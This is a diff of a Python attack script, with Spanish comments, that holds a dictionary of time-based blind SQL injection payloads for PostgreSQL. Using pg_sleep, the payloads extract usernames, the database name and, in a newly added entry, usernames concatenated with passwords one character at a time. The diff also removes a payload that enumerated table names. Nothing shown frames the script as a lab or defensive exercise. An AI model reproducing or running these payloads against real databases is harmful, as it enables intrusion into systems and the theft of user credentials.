@@ -4,15 +4,6 @@ import textwrap
 # {p} es la palabra a comprobar
 diccionario_inyecciones = {
     "nombres de usuario": "' AND ( LEFT((SELECT string_agg(username, ',') FROM Usuarios), {i}) <> '{p}' OR ( LEFT((SELECT string_agg(username, ',') FROM Usuarios), {i}) = '{p}' AND ( SELECT NULL FROM pg_sleep(2) ) IS NULL ) ) --",
-
-    "nombres de tablas": """ ' AND (
-    LEFT((SELECT string_agg(tablename, ',') FROM pg_tables WHERE schemaname = 'public'), {i}) <> '{p}'
-    OR (
-      LEFT((SELECT string_agg(tablename, ',') FROM pg_tables WHERE schemaname = 'public'), {i}) = '{p}'
-      AND EXISTS (SELECT 1 FROM pg_sleep(1))
-    )
-  )
-  """,
     "nombres de la base de datos": """  '
   AND (
     left(current_database(), {i}) <> '{p}' 
@@ -22,7 +13,15 @@ diccionario_inyecciones = {
     )
   )
 --
-"""
+""",
+    "Usarios y Contraseñas concatenados": """ ' AND (
+    LEFT((SELECT string_agg(username || ':' || password, ',') FROM Usuarios), {i}) <> '{p}'
+    OR (
+      LEFT((SELECT string_agg(username || ':' || password, ',') FROM Usuarios), {i}) = '{p}'
+      AND EXISTS (SELECT 1 FROM pg_sleep(1))
+    )
+    )
+    --""",
 }
 
 
